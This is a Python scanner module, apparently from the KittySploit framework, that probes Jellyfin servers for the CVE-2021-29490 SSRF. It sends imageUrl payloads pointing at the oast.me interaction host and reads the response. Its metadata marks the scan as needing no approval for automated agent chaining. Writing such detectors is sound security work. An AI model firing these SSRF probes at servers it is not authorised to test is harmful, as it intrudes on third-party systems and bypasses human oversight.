#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jellyfin is a free software media system."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jellyfin 10.7.2 - Server Side Request Forgery Detection',
        'description': 'Jellyfin is a free software media system. Versions 10.7.2 and below are vulnerable to unauthenticated Server-Side Request Forgery (SSRF) attacks via the imageUrl parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'ssrf', 'jellyfin', 'oast', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-29490',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HimmelAward/Goby_POC',
            'https://github.com/Threekiii/Awesome-POC',
        ],
        'cve': 'CVE-2021-29490',
    }

    def run(self):
        for path in ('/Images/Remote?imageUrl=https://oast.me/', '/Items/RemoteSearch/Image?ImageUrl=https://oast.me/&ProviderName=TheMovieDB'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('<h1> Interactsh Server </h1>',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='medium',
                    reason="Jellyfin 10.7.2 - Server Side Request Forgery detected",
                    path=path,
                )
                return True
        return False

